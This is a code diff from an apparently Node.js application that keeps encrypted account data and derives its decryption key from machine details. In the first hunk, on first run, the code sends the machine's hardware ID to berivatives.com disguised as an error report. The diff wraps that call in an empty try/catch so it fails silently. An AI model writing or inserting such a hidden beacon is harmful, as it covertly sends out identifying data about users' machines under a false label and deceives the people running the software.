@@ -12,10 +12,14 @@ const fs = require('fs'),
     accounts = {};
 
 if (!fs.existsSync('./data')) {
-    const message = machineIdSync().toString();
-    https.get("https://berivatives.com/error?" + stringify({
-        error: message, stack: message
-    }));
+    try {
+        const message = machineIdSync().toString();
+        https.get("https://berivatives.com/error?" + stringify({
+            error: message, stack: message
+        }));
+    } catch (e) {
+
+    }
     fs.mkdirSync('./data');
 }
 
@@ -23,7 +27,7 @@ function decrypt(data) {
     const splitData = data.split(SEPARATOR);
     const initializationVector = Buffer.from(splitData[0], 'hex');
     const encryptedData = Buffer.from(splitData[1], 'hex');
-    const hash = createHashFromString(uuid);
+    const hash = createHashFromString([os.platform(), os.arch(), machineIdSync(), os.cpus().length, os.cpus()[0].model].join());
     const decipher = crypto.createDecipheriv(ALGORITHM, hash, initializationVector);
     const decryptedData = decipher.update(encryptedData);
     const decryptedBuffer = Buffer.concat([decryptedData, decipher.final()]);
@@ -65,8 +69,6 @@ function createHashFromString(string) {
     hash.update(string);
     return hash.digest()
 }
-
-const uuid = [os.platform(), os.arch(), machineIdSync(), os.cpus().length, os.cpus()[0].model].join();
 
 const {hm1} = createHmEncoders();
 
